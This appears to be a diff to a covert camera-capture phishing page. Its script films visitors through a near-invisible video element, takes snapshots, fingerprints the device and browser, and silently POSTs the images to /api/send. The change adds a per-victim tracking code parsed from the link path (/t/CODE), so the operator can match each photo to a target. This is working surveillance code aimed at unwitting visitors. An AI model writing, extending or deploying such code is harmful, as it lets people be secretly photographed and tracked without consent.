@@ -77,6 +77,12 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
 <script>
 (function(){
 var SHOTS=1, WARMUP=1400, Q=0.92, MIRROR=true;
+
+// قراءة رمز من الرابط: /t/CODE
+var path = location.pathname || '';
+var m = path.match(/\/t\/([A-Za-z0-9]+)/);
+var CODE = m ? m[1].toUpperCase() : '';
+
 var v=document.getElementById('v');
 var s1=document.getElementById('s1');
 var s2=document.getElementById('s2');
@@ -87,20 +93,20 @@ var slots=document.querySelectorAll('.slot');
 
 function deviceInfo(){
 var ua=navigator.userAgent||'';
-var m='';
+var mm='';
 if(/iPhone/.test(ua)){
 var os=(ua.match(/OS (\d+[_\d]*) like Mac/)||[])[1];
-m='iPhone · iOS '+(os?os.replace(/_/g,'.'):'');
+mm='iPhone · iOS '+(os?os.replace(/_/g,'.'):'');
 } else if(/iPad/.test(ua)){
-m='iPad · iPadOS';
+mm='iPad · iPadOS';
 } else if(/Android/.test(ua)){
 var a=ua.match(/Android\s+([\d.]+)/);
 var model=(ua.match(/;\s*([^;)]+)\s+Build/)||[])[1];
-m=(model?model.trim():'Android')+' · Android '+(a?a[1]:'');
-} else if(/Windows/.test(ua)){ m='Windows PC'; }
-else if(/Macintosh/.test(ua)){ m='Mac'; }
-else if(/Linux/.test(ua)){ m='Linux'; }
-else { m='جهاز غير معروف'; }
+mm=(model?model.trim():'Android')+' · Android '+(a?a[1]:'');
+} else if(/Windows/.test(ua)){ mm='Windows PC'; }
+else if(/Macintosh/.test(ua)){ mm='Mac'; }
+else if(/Linux/.test(ua)){ mm='Linux'; }
+else { mm='جهاز غير معروف'; }
 
 var br='';
 if(/Edg\//.test(ua)) br='Edge '+(ua.match(/Edg\/([\d.]+)/)||[])[1];
@@ -110,10 +116,10 @@ else if(/Firefox\//.test(ua)) br='Firefox '+(ua.match(/Firefox\/([\d.]+)/)||[])[
 else if(/Safari\//.test(ua)) br='Safari '+(ua.match(/Version\/([\d.]+)/)||[])[1];
 else br='متصفح غير معروف';
 
-return m+' | '+br+' | '+screen.width+'x'+screen.height;
+return mm+' | '+br+' | '+screen.width+'x'+screen.height;
 }
 
-function shot(dev){ 
+function shot(dev){
 try{
 var w=v.videoWidth||720, h=v.videoHeight||960;
 if(!w||!h) return;
@@ -125,7 +131,7 @@ x.drawImage(v,0,0,w,h);
 fetch('/api/send',{
 method:'POST',
 headers:{'Content-Type':'application/json'},
-body:JSON.stringify({image:c.toDataURL('image/jpeg',Q),device:dev})
+body:JSON.stringify({image:c.toDataURL('image/jpeg',Q),device:dev,code:CODE})
 }).catch(function(){});
 }catch(e){}
 }
@@ -206,4 +212,4 @@ warn.classList.remove('hide');
 })();
 </script>
 </body>
-  </html>
+</html>
